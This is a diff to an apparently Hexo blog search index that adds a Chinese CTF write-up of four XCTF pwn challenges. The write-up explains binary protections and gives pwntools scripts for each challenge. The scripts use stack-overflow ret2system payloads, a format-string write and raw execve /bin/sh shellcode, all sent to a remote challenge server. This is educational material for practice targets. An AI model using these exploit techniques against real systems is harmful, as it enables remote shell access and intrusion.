@@ -102,8 +102,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>CC6</tag>
         <tag>JAVA</tag>
+        <tag>CC6</tag>
       </tags>
   </entry>
   <entry>
@@ -298,8 +298,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>JAVA</tag>
         <tag>BCEL</tag>
+        <tag>JAVA</tag>
       </tags>
   </entry>
   <entry>
@@ -1768,6 +1768,107 @@
         <tag>RCE</tag>
         <tag>奇技淫巧</tag>
         <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界部分PWN题</title>
+    <url>/PWN/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94PWN%E9%83%A8%E5%88%86/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随手玩了下，就随手写个WP。</p>
+<span id="more"></span>
+
+<h1 id="攻防世界—cgpwn2"><a href="#攻防世界—cgpwn2" class="headerlink" title="攻防世界—cgpwn2"></a>攻防世界—cgpwn2</h1><p>对附件做一个分析</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_lRKaqFqqJr.png"></p>
+<p>32位程序</p>
+<h2 id="防护机制"><a href="#防护机制" class="headerlink" title="防护机制"></a>防护机制</h2><h3 id="ASLR-Address-space-layout-randomization，地址空间布局随机化"><a href="#ASLR-Address-space-layout-randomization，地址空间布局随机化" class="headerlink" title="ASLR (Address space layout randomization，地址空间布局随机化)"></a>ASLR (Address space layout randomization，地址空间布局随机化)</h3><p>在windows上ASLR主要包括<code>堆栈随机化</code>、<code>PEB</code>（Process Envirorment Block Structure进程环境信息块）与<code>TEB</code>（线程环境快）、<code>映像随机化</code>,windows系统从vista开始ASLR才真正发挥作用。 &amp;#x20;</p>
+<p>在linux上ASLR主要包括<code>栈地址随机化</code>、<code>LIBS/MMAP随机化、EXEC随机化、BRK随机化、VDSO随机化</code>。在没有ASLR的情况下让程序跳转到一个已经存在的系统函数的漏洞利用方式被称为<code>ret2libc</code>。 &amp;#x20;</p>
+<p>在linux系统中<code>ASLR被分为0，1，2三个等级</code>，可以通过<code>sudo bash -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;设置</code>。 &amp;#x20;<br>0：没有随机化。即关闭ASLR。 &amp;#x20;<br>1：保留的随机化。共享库、栈、mmap()分配的内存空间以及VDSO将被随机化。 &amp;#x20;<br>2：完全的随机化。在1的基础上，通过 brk()分配的内存空间也将被随机化。</p>
+<h3 id="NX-Non-Executable-Memory，不可执行内存"><a href="#NX-Non-Executable-Memory，不可执行内存" class="headerlink" title="NX(Non-Executable Memory，不可执行内存)"></a>NX(Non-Executable Memory，不可执行内存)</h3><p>类似于DEP，数据执行保护。</p>
+<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE只有在系统开启ASLR和编译时开启-fpie-pie选项这两个条件同时满足时才会生效。</p>
+<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO(RELocation Read-Only，只读重定位)让加载器将重定位表中加载时解析的符号标记为只读，这减少了GOT覆写攻击的面积。RELRO可以分为Partial RELRO(部分RELRO)和Full RELRO(完整RELRO)。开启Partial RELRO的话GOT表是可写的；开启FULL RELRO的话GOT表是只读的。</p>
+<h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>Stack Protector又名canary，stack cookie……等等，类似于VS编译器中的GS。</p>
+<h2 id="用32位IDA打开附件"><a href="#用32位IDA打开附件" class="headerlink" title="用32位IDA打开附件"></a>用32位IDA打开附件</h2><p>pwn函数中的system无法利用。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PgBpWYFlvO.png"></p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>shift+f12查找字符串并没有发现&#x2F;bin&#x2F;sh，可能需要自己整，或者藏在某个变量里。</p>
+<p>在函数列表里找到了真正的_system，括号内的command似乎是输入，这里插留坑。地址是<code>0x804A0C8</code></p>
+<p>要自己构建执行命令，有个条件：</p>
+<p>要求执行的命令在一个固定的地址上，且可以读取写入。</p>
+<p>题中第一个输入的变量存在name中，<strong>而name标蓝代表全局变量</strong>。</p>
+<ul>
+<li><p>name再<code>.bss</code>段上，还未初始化，但地址也是固定的</p>
+</li>
+<li><p>name前可以看到这一部分的.bss段<code>具有可读写属性</code></p>
+</li>
+</ul>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_jssWUMAemO.png"></p>
+<p>由此构建EXP</p>
+<p>利用第一个输入，写我们想要执行的命令，eg： &#x2F;bin&#x2F;sh</p>
+<p>利用第二个输入的gets进行栈溢出，拼接出 system &#x2F;bin&#x2F;sh：</p>
+<ul>
+<li><p>先将字符串s填满在把s的栈地址填满，将返回地址改成system地址</p>
+</li>
+<li><p>再填四字节无用地址堵住system的返回地址，至于为什么要用四，是因为他的长度为四</p>
+</li>
+<li><p>然后缝合上之前输入的&#x2F;bin&#x2F;sh的地址</p>
+</li>
+</ul>
+<p>python3中需要把所有都转化为字节</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>,<span class="number">63983</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn006&quot;)</span></span><br><span class="line">binsh = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">system = <span class="number">0x8048420</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x26</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">0x4</span> + p32(system) + p32(<span class="number">0</span>) + p32(name)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please tell me your name&quot;</span>,binsh)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;hello,you can leave some message here:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PKhu5FLnGF.png"></p>
+<p>如果用<code>/bin/sh</code> 要在Linux下，因为对方主机是Linux的</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_uKsv24Nb9b.png"></p>
+<h1 id="攻防世界—level0"><a href="#攻防世界—level0" class="headerlink" title="攻防世界—level0"></a>攻防世界—level0</h1><p>先下载附件分析一下。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_k_BI6Ta-qA.png"></p>
+<p>64位程序，未开启Stack典型的栈溢出了。</p>
+<p><code>shift+f12</code></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_xd-8KGQXy8.png"></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_OglOior0aR.png"></p>
+<p>在按x寻找入口函数。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_tjf9P5rDTW.png"></p>
+<p>开始地址是<code>400596</code></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gvJAShSN9w.png"></p>
+<p><code>vulnerable_function()</code> 函数中的buf只有80位。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_CbfulmGFKj.png"></p>
+<p>却可以输入200位。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PTOhSaIC9b.png"></p>
+<p>存在栈溢出。返回地址r是8字节。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_4BKYFn7R5a.png"></p>
+<p>由此构造payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>, <span class="number">57658</span>)</span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(callsystem)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hello, World\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_WRfJIt7opO.png"></p>
+<h1 id="攻防世界—leve2"><a href="#攻防世界—leve2" class="headerlink" title="攻防世界—leve2"></a>攻防世界—leve2</h1><p>流程和上一题没差多少，所以直接给EXP了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>,<span class="number">62163</span>)</span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line">bin_s = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4</span> + p32(system) + p32(<span class="number">0</span>) + p32(bin_s)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="攻防世界-string"><a href="#攻防世界-string" class="headerlink" title="攻防世界-string"></a>攻防世界-string</h1><p>老规矩，先分析一下文件</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_wx8iYZ7bh3.png"></p>
+<p>分析了很多次就不多说了。</p>
+<p>然后用64位IDA打开，从题目名字可猜测，是一道格式化字符串漏洞的题，所以等下<code>print()</code>着重看一下。</p>
+<p>可以在Linux中先将程序跑一遍，对程序的流程和分支有个大概了解。本题是个简单的<code>D&amp;D类型题目</code>。</p>
+<p>用IDA对程序进行分析，顺着程序的流程走，可以看到在<code>sub_400BB9</code>中有<code>printf(&amp;format, &amp;format)</code>语句，存在格式化字符串漏洞。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_QRWZ87gqzD.png"></p>
+<p>此外，在函数<code>sub_400CA6</code>中，可以发现<code>_QWORD</code>的分支有命令执行的语句，可以直接执行外部输入的命令。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Bn83Rw2Nf3.png"></p>
+<p>因此，本题的关键在于，如何利用格式化字符串漏洞，让程序的控制流进入到命令执行语句；也就是说，进入<code>sub_400CA6</code>函数中，且满足<code>*a == a1[1]</code>的条件。</p>
+<p>IDA进行具体分析：</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_m1EVc4Vam2.png"></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_tuBTSmuzG_.png"></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_V1WBvV-tGS.png"></p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_239oeQ1_yV.png"></p>
+<p>使用Pwngdb在<code>printf(&amp;format, &amp;format)</code> 处设置断点，输入<code>0x052345</code>，在栈顶的第二个8字节，根据64位程序的传参方式，该地址是格式化字符串的第 7 个参数，<code>printf()</code> 函数的第 8 个参数。</p>
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_svTqth0fmx.png"></p>
+<p>由此可以得到EXP</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch = &#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># context(terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./string&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>, <span class="number">58455</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;secret[0] is &#x27;</span>)</span><br><span class="line">v3_addr = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v3_addr = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + v3_addr, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(v3_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;name be:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;east or up?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;east&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;leave(0)?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;\&#x27;Give me an address\&#x27;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(v3_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;you wish is:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%85c%7$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;I will help you! USE YOU SPELL&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_sV8DjeRxJ4.png"></p>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>ROP</tag>
       </tags>
   </entry>
   <entry>
